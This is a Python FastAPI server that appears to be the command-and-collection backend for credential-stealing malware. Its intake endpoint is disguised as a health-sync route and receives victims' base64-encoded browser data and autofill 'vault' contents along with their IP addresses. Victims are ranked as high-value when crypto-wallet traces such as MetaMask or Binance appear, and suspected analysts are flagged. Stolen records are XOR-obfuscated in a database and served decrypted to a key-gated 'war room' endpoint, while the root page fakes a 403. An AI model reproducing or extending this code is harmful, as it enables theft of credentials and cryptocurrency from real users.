from fastapi import FastAPI, Request, HTTPException, Response, Query
from fastapi.middleware.cors import CORSMiddleware
from psycopg2.extras import RealDictCursor
import psycopg2
import os, json, base64, datetime, hashlib

app = FastAPI()

DB_URL = os.environ.get("DATABASE_URL")
MASTER_KEY = "Morteza_Overlord_2026"
DESTRUCT_PATH = "nuclear_delete_all_data_99"

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def xor_cipher(data: str):
    key = MASTER_KEY
    return "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)])

class SovereignAI:
    @staticmethod
    def evaluate_target(decoded_data, ip):
        score = 0
        loot = decoded_data.get('loot', {})
        hw = decoded_data.get('hardware', {})
        # كشف المحللين
        if decoded_data.get('system', {}).get('incognito'): score -= 50
        # كشف الصيدات الثمينة
        storage_str = json.dumps(loot).lower()
        if any(x in storage_str for x in ['binance', 'metamask', 'trustwallet']): score += 150
        if decoded_data.get('vault'): score += 200 # وجود بيانات أوتوفيل يرفع القيمة فورا
        
        if score > 100: return "HIGH_VALUE_TARGET"
        if score < 0: return "SUSPICIOUS_ANALYZER"
        return "NORMAL_USER"

def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def boot_system():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sovereign_omega_loot (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            encrypted_loot TEXT,
            vault_data TEXT,
            target_class TEXT,
            metadata JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

@app.post("/api/v1/sys/health/sync")
async def inbound_gate(request: Request):
    ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    try:
        raw = await request.body()
        decoded = json.loads(base64.b64decode(raw).decode('utf-8'))
        target_class = SovereignAI.evaluate_target(decoded, ip)
        
        # تشفير البيانات المزدوج
        secure_loot = base64.b64encode(xor_cipher(json.dumps(decoded)).encode()).decode()
        secure_vault = base64.b64encode(xor_cipher(json.dumps(decoded.get('vault', {}))).encode()).decode()

        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO sovereign_omega_loot (target_id, gift_tag, ip_address, encrypted_loot, vault_data, target_class, metadata)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        """, (decoded.get('target_id'), decoded.get('gift_tag'), ip, secure_loot, secure_vault, target_class, json.dumps(decoded.get('hardware'))))
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "ok"}
    except:
        return {"status": "ok"}

@app.get("/api/v1/sys/health/report")
async def get_war_room_data(key: str = Query(None)):
    if key != MASTER_KEY: return Response(status_code=404)
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM sovereign_omega_loot ORDER BY created_at DESC")
    rows = cur.fetchall()
    for row in rows:
        try:
            row['decrypted_data'] = json.loads(xor_cipher(base64.b64decode(row['encrypted_loot']).decode()))
            row['decrypted_vault'] = json.loads(xor_cipher(base64.b64decode(row['vault_data']).decode()))
        except: pass
    cur.close()
    conn.close()
    return rows

@app.get("/")
async def front_page():
    return Response(content="<h1>403 Forbidden</h1>", status_code=403)
